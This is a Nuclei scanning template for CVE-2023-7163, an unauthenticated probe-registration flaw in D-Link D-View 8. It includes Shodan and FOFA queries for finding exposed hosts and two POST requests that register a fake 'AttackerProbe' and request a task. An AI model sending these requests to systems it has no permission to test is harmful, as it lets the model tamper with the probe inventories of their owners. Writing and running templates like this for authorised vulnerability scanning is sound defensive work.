id: CVE-2023-7163

info:
  name: Unauthenticated Probe-Core Server Communication in D-Link D-View 8
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    A security issue in D-Link D-View 8 v2.0.2.89 and prior allows attackers to manipulate the probe inventory of the D-View service,
    leading to information disclosure, denial of service, or execution of tasks on other probes.
  impact: |
    An attacker can exploit this vulnerability to gain unauthorized access to sensitive information.
  remediation: |
    Apply the necessary security patches provided by D-Link to mitigate the CVE-2023-7163 vulnerability.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2023-7163
    cwe-id: CWE-20,NVD-CWE-noinfo
    epss-score: 0.00596
    epss-percentile: 0.79035
    cpe: cpe:2.3:a:dlink:d-view_8:2.0.2.89:*:*:*:*:*:*:*
  metadata:
    vendor: dlink
    product: d-view_8
    shodan-query: http.favicon.hash:-1317621215
    fofa-query: icon_hash="-1317621215"

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/probe-online"

    body: |
      {
        "probeId": "probe-<mac-address>",
        "probeName": "AttackerProbe",
        "IP": "192.168.1.1",
        "coreServerIp": "{{BaseURL}}",
        "port": "8080",
        "sysDescription": "Fake Probe",
        "location": "Attacker Location",
        "associationCode": "12345"
      }

    headers:
      Content-Type: application/json
    matchers:
      - type: word
        words:
          - "Successfully registered"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/api/request_task"

    body: |
      {
        "taskId": "1",
        "probeId": "probe-<mac-address>",
        "taskType": "fetch",
        "taskStatus": "pending",
        "errorCode": "0",
        "createTime": "2023-01-01T00:00:00Z",
        "extTimestamp": "2023-01-01T00:00:01Z"
      }

    headers:
      Content-Type: application/json
    matchers:
      - type: word
        words:
          - "task details"
        part: body
